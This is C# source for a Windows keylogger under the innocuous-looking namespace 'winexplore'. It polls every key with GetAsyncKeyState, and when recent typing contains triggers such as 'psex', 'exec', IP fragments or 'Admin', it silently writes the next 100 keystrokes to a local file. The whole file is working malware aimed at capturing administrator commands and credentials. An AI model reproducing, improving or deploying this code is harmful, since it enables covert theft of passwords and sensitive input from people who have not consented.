using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Input;
using System.Runtime.InteropServices;

namespace winexplore
{
    class Program
    {

        
        [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            string PATH = @"output.txt";
            int READSIZE = 100; // Number of characters to read after being activated, to prevent collateral damage
            int currentRead = 0;

            StreamWriter w = File.AppendText(PATH);
            w.AutoFlush = true;

            bool shiftDown = false;
            bool capsLock = false;
            bool record = false;
            bool justTriggered = true;

            Dictionary<int, string> conversionTable = new Dictionary<int, string>
            {
                {13, "NLINE" },
                {9, "\t" },
                {17, "ctrl" },
                {162, "" },
                {32, " " },
                {48, ")" },
                {49, "!" },
                {50, "''" },
                {51, "£" },
                {52, "$" },
                {53, "%" },
                {54, "^" },
                {55, "&" },
                {56, "*" },
                {57, "(" },
                {220, @"\" },
                {191, "/" },
                {188, "," },
                {190, "." },
                {189, "-" },
                {8, "BAK" }
            };


            List<string> buffer = new List<string>();
            for (int x = 0; x <= 9; x++)
            {
                buffer.Add("0");
            }
            Console.WriteLine(buffer.Count);
            int last = -1;

            while (true)
            {
                string[] triggers = new string[] { "psex", "exec", "exe", "10.", "21", "231", "Admin"};

                Thread.Sleep(100);
                for(int i = 0; i<255; i++)
                {

                    int keystate = GetAsyncKeyState(i);


                    if(keystate != 0 && i != last)
                    {
                        last = i;
                        if(i == 16)
                        {
                            shiftDown = true;
                        }
                        if(i == 20)
                        {
                            capsLock = !capsLock;
                        }

                        if(conversionTable.Keys.Contains(i) && (i < 48 || i > 57))
                        {
                           buffer.Add(conversionTable[i]);
                        }
                        else
                        {
                            if(i >= 48 && i <= 57)
                            {
                                if(shiftDown)
                                {
                                    buffer.Add(conversionTable[i]);
                                    buffer.RemoveAt(0);

                                }
                                else
                                {
                                    buffer.Add((i - 48).ToString());
                                    buffer.RemoveAt(0);

                                }
                            }
                            if(i <= 90 && i >= 65)
                            {
                                string letter = ((char)(i + 32)).ToString();
                                if(shiftDown || capsLock)
                                {
                                   buffer.Add(letter.ToUpper());
                                   buffer.RemoveAt(0);

                                }
                                else
                                {
                                    buffer.Add(letter);
                                    buffer.RemoveAt(0);

                                }
                            }
                        }

                        if (record)
                        {
                            Console.Write(buffer[(buffer.Count - 1)]);
                            w.Write(buffer[(buffer.Count - 1)]);
                            currentRead += 1;
                            if (currentRead == READSIZE)
                            {
                                record = false;
                                w.Write("|EOR|\n");
                            }
                        }
                    }
                    if (keystate != 0 && i == last)
                    {
                        last = -1;
                        Thread.Sleep(50);
                    }

                    if(keystate == 0 && i == 16)
                    {
                        shiftDown = false;
                    }
                }

                string last10 = String.Join("", buffer.ToArray()).ToLower();
                Console.WriteLine(last10);
                foreach(string trig in triggers)
                {
                    if(last10.Contains(trig))
                    {
                        record = true;
                        if (justTriggered)
                        {
                            w.Write(last10);
                            justTriggered = false;
                        }
                        
                    }
                }

            }

        }
    }
}
